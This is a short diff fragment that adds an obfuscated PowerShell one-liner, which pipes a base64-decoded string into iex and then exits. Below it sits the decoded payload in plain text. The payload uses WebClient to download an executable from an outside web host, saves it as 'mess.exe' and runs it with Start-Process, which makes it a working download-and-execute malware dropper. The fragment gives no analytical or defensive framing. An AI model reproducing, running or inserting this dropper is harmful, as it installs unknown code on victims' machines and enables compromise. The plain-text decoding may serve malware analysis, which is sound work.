@@ -1,0 +1,7 @@
+iex([sYstem.TEXt.ENcOdING]::Utf8.getStrInG([sySteM.conVErt]::frOmBAsE64sTrinG('CihOZXctT2JqZWN0IFNZU3RlbS5uRXQud0ViY0xJRW5UKS5kb1dOTE9BZEZpTGUoJ2h0dHA6Ly9jYWpvcy5pbi8weC8xLmV4ZScsJ21lc3MuZXhlJyk7U3RhcnQtUHJvY2VzcyAnbWVzcy5leGUnCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYStem.nEt.wEbcLIEnT).doWNLOAdFiLe('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'
+
